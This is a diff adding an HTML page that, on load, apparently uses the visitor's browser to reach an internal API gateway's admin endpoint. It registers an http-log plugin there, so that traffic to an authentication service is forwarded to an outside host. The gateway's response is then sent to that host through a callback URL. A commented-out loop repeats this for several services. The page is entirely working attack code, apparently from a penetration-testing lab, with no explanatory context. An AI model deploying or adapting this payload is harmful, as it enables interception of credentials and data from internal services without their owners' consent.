@@ -1,0 +1,53 @@
+<html>
+<head>
+<script>
+
+function setupTrafficLog() {
+  var form_test = {
+    'name':'http-log',
+    'config.http_endpoint':'http://192.168.119.163/directus_auth_service',
+    'config.method':'POST',
+    'config.timeout':'1000',
+    'config.keepalive':'1000',
+    'config.flush_timeout':'2',
+    'config.retry_count':'15'
+  }
+  fetch('http://172.16.16.4:8001/plugins/', {  
+        method: "post",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams(form_test)
+  }).then(response=>response.text())
+  .then(function (data) {
+    fetch("http://192.168.119.163/callback?plugin&"+ data);
+  })
+  /*
+  let services = [ 'directus_auth_service', 'directus_users_service','directus_files_service', 'render_service'];
+
+  for (let i = 0; i < services.length; i++) {
+    let url = 'http://172.16.16.4:8001/services/' + services[i];
+    var form_body = {
+      'name':'http-log',
+      'config.http_endpoint':'http://192.168.119.163/'+ services[i],
+      'config.method':'POST',
+      'config.timeout':'1000',
+      'config.keepalive':'1000',
+      'config.flush_timeout':'2',
+      'config.retry_count':'15'
+    }
+    fetch(url, {  
+          method: "post",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams(form_body)
+    }).then(response=>response.text())
+    .then(function (data) {
+        fetch("http://192.168.119.163/callback?setupComplete&"+services[i]+ data);
+    });
+  }
+*/
+}
+</script>
+</head>
+<body onload='setupTrafficLog()'>
+<div></div>
+</body>
+</html>
